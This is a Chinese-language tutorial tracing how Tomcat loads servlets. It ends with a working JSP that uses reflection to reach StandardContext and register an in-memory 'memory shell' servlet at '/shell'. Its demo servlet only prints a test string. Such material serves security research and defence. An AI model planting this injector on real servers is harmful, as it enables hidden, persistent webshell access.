# Servlet 内存马

Servlet内存马的原理就是动态创建一个恶意servlet，与Filter相似，只是过程不同。核心还是在StandardContext。

创建一个Servlet，看Tomcat是如何加载Servlet。
```java
package servlet;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class index extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.getWriter().write("Index Test Page");
        resp.getWriter().flush();
    }
}
```
在doGet函数下断点并触发断点，调用堆栈如下
```
doGet:12, index (servlet)
service:656, HttpServlet (javax.servlet.http)
service:765, HttpServlet (javax.servlet.http)
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:367, CoyoteAdapter (org.apache.catalina.connector)
service:639, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:750, Thread (java.lang)
```
可以看到，在ApplicationFilterChain类的internalDoFilter方法中调用了Servlet的service方法。
```java
private void internalDoFilter(ServletRequest request,
        ServletResponse response)
        throws IOException, ServletException{
        ...
        servlet.service(request,response);
        ...
}
```
来看看internalDoFilter的servlet是怎么来的，在ApplicationFilterChain类的setServlet方法下断点并触发断点。
```java
// org/apache/catalina/core/ApplicationFilterChain.java

void setServlet(Servlet servlet) {
    this.servlet = servlet;
}
```
调用堆栈如下
```
setServlet:325, ApplicationFilterChain (org.apache.catalina.core)
createFilterChain:80, ApplicationFilterFactory (org.apache.catalina.core)
invoke:169, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:367, CoyoteAdapter (org.apache.catalina.connector)
service:639, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:750, Thread (java.lang)
```
可以发现setServlet方法在ApplicationFilterFactory类的createFilterChain方法中被调用
```java
// org/apache/catalina/core/ApplicationFilterFactory.java

public static ApplicationFilterChain createFilterChain(ServletRequest request,
        Wrapper wrapper, Servlet servlet) {
    ...
    filterChain.setServlet(servlet);
    ...
}
```
向上跟踪，最终发现servlet是由StandardWrapper的allocate负责赋值的
```java
// org/apache/catalina/core/StandardWrapperValve.java

public final void invoke(Request request, Response response)
    throws IOException, ServletException {
    ...
    servlet = wrapper.allocate();
    ...
}
```
在allocate方法中，返回的servlet是loadServlet()方法赋值的。
```java
public synchronized Servlet loadServlet() throws ServletException {
    ...
    Servlet servlet;
    ...
    InstanceManager instanceManager = ((StandardContext)getParent()).getInstanceManager();
    ...
    // 实例化servletClass类
    servlet = (Servlet) instanceManager.newInstance(servletClass);
}
```
看看servletClass赋值的参数被谁调用，在setServletClass下断点并重启Tomcat触发该断点
```java
public void setServletClass(String servletClass) {

    String oldServletClass = this.servletClass;
    this.servletClass = servletClass;
    support.firePropertyChange("servletClass", oldServletClass,
                               this.servletClass);
    if (Constants.JSP_SERVLET_CLASS.equals(servletClass)) {
        isJspServlet = true;
    }
}
```
发现setServletClass方法在启动Tomcat时被ContextConfig触发
```java
private void configureContext(WebXml webxml) {

    Wrapper wrapper = context.createWrapper();
    
    wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
    
    wrapper.setName(servlet.getServletName());
    
    wrapper.setServletClass(servlet.getServletClass());
    
    context.addChild(wrapper);
    
    context.addServletMappingDecoded(entry.getKey(), entry.getValue());
}
```
至此，servlet内存马就可以写出来了
```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %><%--
  Created by IntelliJ IDEA.
  User: Luc
  Date: 2022/12/19
  Time: 16:25
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  ServletContext servletContext = request.getSession().getServletContext();

  Field appctx = servletContext.getClass().getDeclaredField("context");
  appctx.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

  Field standContext = applicationContext.getClass().getDeclaredField("context");
  standContext.setAccessible(true);
  StandardContext standardContext = (StandardContext) standContext.get(applicationContext);

  Servlet servlet = new HttpServlet() {
      @Override
      protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
          resp.getWriter().write("Inject test Page");
      }
  };

  Wrapper newWrapper = standardContext.createWrapper();
  newWrapper.setName("Wh0Am1");
  newWrapper.setLoadOnStartup(1);
  // setServlet 是因为instance不为空的话会直接返回
  newWrapper.setServlet(servlet);
  newWrapper.setServletClass(servlet.getClass().getName());

  standardContext.addChild(newWrapper);
  standardContext.addServletMappingDecoded("/shell","Wh0Am1");
%>
<html>
<head>
    <title>Title</title>
</head>
<body>

</body>
</html>

```